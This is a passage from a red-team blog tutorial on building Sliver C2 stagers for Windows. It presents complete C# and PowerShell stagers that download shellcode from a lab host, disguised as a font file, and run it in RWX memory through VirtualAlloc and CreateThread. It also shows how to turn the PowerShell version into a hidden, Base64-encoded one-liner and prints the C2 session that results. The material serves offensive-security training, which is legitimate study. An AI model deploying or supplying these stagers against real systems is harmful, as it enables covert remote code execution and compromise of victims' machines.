and use it&rsquo;s <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata">DownloadData</a>
method to download binary data from a <code>url</code>.
I&rsquo;ve also prepended a
<a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.servicepointmanager.servercertificatevalidationcallback">ServerCertificateValidationCallback</a>
which returns <code>true</code> in all cases to ensure that certificate errors for HTTPS don&rsquo;t stop the download.
This is not required here since we download from a plain HTTP listener.
I&rsquo;ve put it here nevertheless because it may one day be useful.</p>
<p>Here is the <code>Download</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] Download(<span style="color:#66d9ef">string</span> url)
{
    ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =&gt; <span style="color:#66d9ef">true</span>;

    System.Net.WebClient client = <span style="color:#66d9ef">new</span> System.Net.WebClient();
    <span style="color:#66d9ef">byte</span>[] shellcode = client.DownloadData(url);

    <span style="color:#66d9ef">return</span> shellcode;
}
</code></pre></div><p>Now we need a way to run shellcode to implement the <code>Execute</code> function.
There is an example in the <a href="https://github.com/BishopFox/sliver/wiki/Stagers#custom-stagers">Sliver wiki</a>
that illustrates how it can be done. I&rsquo;ve used the same technique here.</p>
<p>Rather than loading the shellcode into memory and directly calling it,
this code will create a new thread for the shellcode and then block the primary thread
to avoid that <code>Main</code> returns.</p>
<p>To get this done, we need a few functions from Windows API.
This is because a .NET application run in what&rsquo;s called the
Common Language Runtime (CLR) which manages the memory for us.
It&rsquo;s just not built for allocating memory manually or writing shellcode to it.</p>
<p>However, .NET is integrated with the Windows API through a technology
called <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">P/Invoke</a>.
It allows to call unmanaged code (e.g., functions from <code>kernel32.dll</code>) from managed code, i.e.,
from code running on .NET.
There is a wiki at <a href="https://www.pinvoke.net/">pinvoke.net</a> which provides code snippets
for all sorts of functions you might want to call.
All you have to do is to paste these snippets into your code (and import a few namespaces).
For example, to get <a href="https://www.pinvoke.net/default.aspx/kernel32.VirtualAlloc">VirtualAlloc</a>,
you need this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#a6e22e">[DllImport(&#34;kernel32&#34;)]</span>
<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAlloc(IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
</code></pre></div><p>These code snippets in the wiki show you how to write the function signature.
Comparing the types of the arguments above to the ones defined in the
<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">documentation of VirtualAlloc</a>,
you notice that they are different. The actual definition looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">LPVOID <span style="color:#a6e22e">VirtualAlloc</span>(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
</code></pre></div><p>For example, <code>lpAddress</code> is an <code>IntPtr</code> in C# but <code>LPVOID</code> in C.
Of course the types can&rsquo;t be the same because there is no <code>LPVOID</code> in C#.
P/Invoke will convert values back and forth as needed (type marshalling), but for that to work
you have to use types in your C# signature definition that are compatible with
the real ones. This is what&rsquo;s documented on <a href="https://www.pinvoke.net/">pinvoke.net</a>.
If you ever need a function that&rsquo;s not documented there, you could also use educated guessing to create your own signature.
This <a href="https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d">blog post</a>
may help since it provides a good mapping table and also extensive details around it.
Of course, there is also a table in the <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/type-marshalling#default-rules-for-marshalling-common-types">official documentation</a>.</p>
<p>Now we can write the <code>Download</code> function using functions from <code>kernel32</code>.
We first use <a href="https://www.pinvoke.net/default.aspx/kernel32.VirtualAlloc">VirtualAlloc</a>
to allocate RWX memory (<code>0x40</code> as last argument) located at <code>addr</code>,
copy the shellcode in there with <code>Marshal.Copy</code>
and then use <a href="https://www.pinvoke.net/default.aspx/kernel32.CreateThread">CreateThread</a>
to run the shellcode in a new thread.
Finally, we use <a href="https://www.pinvoke.net/default.aspx/kernel32.WaitForSingleObject">WaitForSingleObject</a>
to wait for the new thread. <code>0xFFFFFFFF</code> is how long we wait, which stands for <code>INFINITE</code>
so that we wait forever.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#a6e22e">[DllImport(&#34;kernel32&#34;)]</span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAlloc(IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">[DllImport(&#34;kernel32&#34;)]</span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateThread(IntPtr lpThreadAttributes, <span style="color:#66d9ef">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#66d9ef">uint</span> dwCreationFlags, IntPtr lpThreadId);
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">[DllImport(&#34;kernel32.dll&#34;)]</span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Execute(<span style="color:#66d9ef">byte</span>[] shellcode)
{
    IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x40</span>);
    Marshal.Copy(shellcode, <span style="color:#ae81ff">0</span>, (IntPtr)(addr), shellcode.Length);


    IntPtr hThread = IntPtr.Zero;
    IntPtr threadId = IntPtr.Zero;
    hThread = CreateThread(IntPtr.Zero, <span style="color:#ae81ff">0</span>, addr, IntPtr.Zero, <span style="color:#ae81ff">0</span>, threadId);

    WaitForSingleObject(hThread, <span style="color:#ae81ff">0xFFFFFFFF</span>);

    <span style="color:#66d9ef">return</span>;
}
</code></pre></div><p>This was it.
Put all of it together into a single file in your solution:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
<span style="color:#66d9ef">using</span> System.Net;
<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;

<span style="color:#66d9ef">namespace</span> Sliver_stager
{
    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
    {
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(String[] args)
        {
            <span style="color:#66d9ef">byte</span>[] shellcode = Download(<span style="color:#e6db74">&#34;http://sliver.labnet.local/fontawesome.woff&#34;</span>);
            Execute(shellcode);

            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] Download(<span style="color:#66d9ef">string</span> url)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =&gt; <span style="color:#66d9ef">true</span>;

            System.Net.WebClient client = <span style="color:#66d9ef">new</span> System.Net.WebClient();
            <span style="color:#66d9ef">byte</span>[] shellcode = client.DownloadData(url);

            <span style="color:#66d9ef">return</span> shellcode;
        }
<span style="color:#a6e22e">
</span><span style="color:#a6e22e">
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAlloc(IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
<span style="color:#a6e22e">        
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateThread(IntPtr lpThreadAttributes, <span style="color:#66d9ef">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#66d9ef">uint</span> dwCreationFlags, IntPtr lpThreadId);
<span style="color:#a6e22e">        
</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Execute(<span style="color:#66d9ef">byte</span>[] shellcode)
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x40</span>);
            Marshal.Copy(shellcode, <span style="color:#ae81ff">0</span>, (IntPtr)(addr), shellcode.Length);
        
        
            IntPtr hThread = IntPtr.Zero;
            IntPtr threadId = IntPtr.Zero;
            hThread = CreateThread(IntPtr.Zero, <span style="color:#ae81ff">0</span>, addr, IntPtr.Zero, <span style="color:#ae81ff">0</span>, threadId);
        
            WaitForSingleObject(hThread, <span style="color:#ae81ff">0xFFFFFFFF</span>);
        
            <span style="color:#66d9ef">return</span>;
        }
    }
}
</code></pre></div><p>We are ready to build the stager.
In Visual Studio, hit &ldquo;Build&rdquo;, then &ldquo;Build Solution&rdquo;.
Then locate it on disk, run it and marvel at the result.
As before, there should be a new Sliver session on the C2 server.</p>
<h3 id="powershell-stager">PowerShell Stager</h3>
<p>Time for the last stager. Unlike those before, it will be a PowerShell script
rather than a compiled executable.</p>
<p>Like C#, PowerShell itself also does not allow direct access to memory.
Therefore we are in the same situation again.
We have to call functions from low-level libraries but it&rsquo;s not really supported.</p>
<p>While there is no equivalent of P/Invoke in PowerShell,
there is good interoperability between PowerShell and C#.
Using the <code>Add-Type</code> cmdlet, you can add a .NET class to a PowerShell
session. This way we can use P/Invoke in PowerShell too.</p>
<p>The following code snippet adds a class called <code>Win32</code> to PowerShell
which exposes <code>VirtualAlloc</code>, <code>CreateThread</code> and <code>WaitForSingleObject</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$Win32 = <span style="color:#e6db74">@&#34;
</span><span style="color:#e6db74">using System;
</span><span style="color:#e6db74">using System.Runtime.InteropServices;
</span><span style="color:#e6db74">public class Win32 {
</span><span style="color:#e6db74">[DllImport(&#34;kernel32&#34;)]
</span><span style="color:#e6db74">public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
</span><span style="color:#e6db74">    uint dwSize,
</span><span style="color:#e6db74">    uint flAllocationType,
</span><span style="color:#e6db74">    uint flProtect);
</span><span style="color:#e6db74">[DllImport(&#34;kernel32&#34;, CharSet=CharSet.Ansi)]
</span><span style="color:#e6db74">public static extern IntPtr CreateThread(
</span><span style="color:#e6db74">    IntPtr lpThreadAttributes,
</span><span style="color:#e6db74">    uint dwStackSize,
</span><span style="color:#e6db74">    IntPtr lpStartAddress,
</span><span style="color:#e6db74">    IntPtr lpParameter,
</span><span style="color:#e6db74">    uint dwCreationFlags,
</span><span style="color:#e6db74">    IntPtr lpThreadId);
</span><span style="color:#e6db74">[DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
</span><span style="color:#e6db74">public static extern UInt32 WaitForSingleObject(
</span><span style="color:#e6db74">    IntPtr hHandle,
</span><span style="color:#e6db74">    UInt32 dwMilliseconds);
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">&#34;@</span>
Add-Type $Win32
</code></pre></div><p>It&rsquo;s important to note that even though the
<a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type">official documentation</a>
mentioned that this code will be compiled to &ldquo;an in-memory assembly&rdquo;,
the compiler will still create artifacts on disk.
Most of the time, the goal of using PowerShell is to avoid exactly that.
There are ways around it. Read more
<a href="https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-3/">about reflection</a>
if you are interested.
However, it&rsquo;s a quick way to get the stager running so I&rsquo;ll use it here.</p>
<p>The actual PowerShell code is even shorter than the C# code
(again, I skipped retrying and pretty much all other bells and whistles).
The following three lines download shellcode, ensure some data was retrieved
and store it&rsquo;s size into a variable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$shellcode = (New-Object System.Net.WebCLient).DownloadData(<span style="color:#e6db74">&#34;http://sliver.labnet.local/fontawesome.woff&#34;</span>)
<span style="color:#66d9ef">if</span> ($shellcode <span style="color:#f92672">-eq</span> $null) {Exit};
$size = $shellcode.Length
</code></pre></div><p>Next, we use the well-known combination of functions again to run the shellcode.
It looks this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[IntPtr]</span>$addr = <span style="color:#66d9ef">[Win32]</span>::VirtualAlloc(0,$size,0x1000,0x40);
<span style="color:#66d9ef">[System.Runtime.InteropServices.Marshal]</span>::Copy($shellcode, 0, $addr, $size)
$thandle=<span style="color:#66d9ef">[Win32]</span>::CreateThread(0,0,$addr,0,0,0);
<span style="color:#66d9ef">[Win32]</span>::WaitForSingleObject($thandle, <span style="color:#66d9ef">[uint32]</span><span style="color:#e6db74">&#34;0xFFFFFFFF&#34;</span>)
</code></pre></div><p>Note how we use the class <code>Win32</code> and call it&rsquo;s static methods like <code>VirtualAlloc</code>
with the following notation: <code>[Win32]::VirtualAlloc(...)</code>.
This notation works the same for common .NET classes and their static methods.
For example, <code>[System.Runtime.InteropServices.Marshal]::Copy(...)</code>
is the PowerShell way of using the same method we used above in the C# stager
to copy shellcode to a memory address. No need to use <code>Add-Type</code> for those
common classes.</p>
<p>Put together, the code looks as seen below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$Win32 = <span style="color:#e6db74">@&#34;
</span><span style="color:#e6db74">using System;
</span><span style="color:#e6db74">using System.Runtime.InteropServices;
</span><span style="color:#e6db74">public class Win32 {
</span><span style="color:#e6db74">[DllImport(&#34;kernel32&#34;)]
</span><span style="color:#e6db74">public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
</span><span style="color:#e6db74">    uint dwSize,
</span><span style="color:#e6db74">    uint flAllocationType,
</span><span style="color:#e6db74">    uint flProtect);
</span><span style="color:#e6db74">[DllImport(&#34;kernel32&#34;, CharSet=CharSet.Ansi)]
</span><span style="color:#e6db74">public static extern IntPtr CreateThread(
</span><span style="color:#e6db74">    IntPtr lpThreadAttributes,
</span><span style="color:#e6db74">    uint dwStackSize,
</span><span style="color:#e6db74">    IntPtr lpStartAddress,
</span><span style="color:#e6db74">    IntPtr lpParameter,
</span><span style="color:#e6db74">    uint dwCreationFlags,
</span><span style="color:#e6db74">    IntPtr lpThreadId);
</span><span style="color:#e6db74">[DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
</span><span style="color:#e6db74">public static extern UInt32 WaitForSingleObject(
</span><span style="color:#e6db74">    IntPtr hHandle,
</span><span style="color:#e6db74">    UInt32 dwMilliseconds);
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">&#34;@</span>
Add-Type $Win32

$shellcode = (New-Object System.Net.WebCLient).DownloadData(<span style="color:#e6db74">&#34;http://sliver.labnet.local/fontawesome.woff&#34;</span>)
<span style="color:#66d9ef">if</span> ($shellcode <span style="color:#f92672">-eq</span> $null) {Exit};
$size = $shellcode.Length

<span style="color:#66d9ef">[IntPtr]</span>$addr = <span style="color:#66d9ef">[Win32]</span>::VirtualAlloc(0,$size,0x1000,0x40);
<span style="color:#66d9ef">[System.Runtime.InteropServices.Marshal]</span>::Copy($shellcode, 0, $addr, $size)
$thandle=<span style="color:#66d9ef">[Win32]</span>::CreateThread(0,0,$addr,0,0,0);
<span style="color:#66d9ef">[Win32]</span>::WaitForSingleObject($thandle, <span style="color:#66d9ef">[uint32]</span><span style="color:#e6db74">&#34;0xFFFFFFFF&#34;</span>)
</code></pre></div><p>It is possible to get a handy one-liner from this code.
Put the code into a file <code>stager.ps1</code> and convert to Base64: <code>cat stager.ps1 | iconv --to-code UTF-16LE | base64 -w 0</code>
This command assumes you work in Linux. <code>iconv</code> converts the code to UTF16 little-endian which is the
encoding used in Windows (but not Linux).</p>
<p>This Base64-encoded code can now be passed as an argument to PowerShell.
For example, the one-liner could look like this:</p>
<pre tabindex="0"><code>powershell.exe -nop -w hidden -Enc JABXAGkAbgAzADIAI...RgBGACIAKQAKAA==
</code></pre><p>The argument <code>-nop</code> avoids that a custom PowerShell profile get loaded,
which may break our code.  With <code>-w hidden</code> we ensure that the console windows
is not visible (or disappears if you paste the code into one).
Our Base64-encoded code is passed with <code>-Enc</code>.</p>
<p>This is how to paste the one-liner into a command prompt window:</p>











<figure>
  
    
      <img class="lazyload" data-src="/img/29_sliver_c2_stagers/run_powershell_stager.png"  />
    
  
  
  <figcaption>
    <header><b>Paste PowerShell stager into terminal</b></header>
    
  </figcaption>
  
</figure>
<style media="screen">
  .blur-up {
    -webkit-filter: blur(5px);
    filter: blur(5px);
    transition: filter 400ms, -webkit-filter 400ms;
  }
  .blur-up.lazyloaded {
    -webkit-filter: blur(0);
    filter: blur(0);
  }
</style>

<p>Due to <code>-w hidden</code> the Window will disappear as you run the command.
A session should appear in Sliver.</p>
<pre tabindex="0"><code>[*] Session 02eecb04 LIKELY_CLIMATE - 192.168.122.32:51362 (DESKTOP-2CNJ1IR) - windows/amd64 - Thu, 22 Sep 2022 23:05:19 CEST
</code></pre>
    </div>
    
    <footer>
      <hr>
      <p>
  Published
  
    
      by <span itemprop="author">Dominic Breuker</span>
    
  
  <time itemprop="datePublished" datetime="2022-09-30T00:00:00&#43;00:00">
    30 Sep, 2022
  </time>
  
    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
  
  
    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/sliver/">sliver</a>, <a href="/tags/stagers/">stagers</a> and <a href="/tags/tutorial/">tutorial</a>
  
  using <span itemprop="wordCount">5379</span> words.
</p>

      


  <aside>
    <header>Related Content</header>
    <ul>
      
        <li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
        <time datetime="9M">9 minutes</time>
      
        <li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
        <time datetime="19M">19 minutes</time>
      
        <li><a href="/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</a>
        <time datetime="11M">11 minutes</time>
      
        <li><a href="/post/learning_sliver_c2_02_beacons_and_sessions/">Learning Sliver C2 (02) - Beacons and Sessions</a>
        <time datetime="14M">14 minutes</time>
      
        <li><a href="/post/learning_sliver_c2_01_installation/">Learning Sliver C2 (01) - Tutorial / Installation</a>
        <time datetime="8M">8 minutes</time>
      
    </ul>
  </aside>


    </footer>
  </article>
</main>
    <footer>
  

</footer>
  </body>
</html>
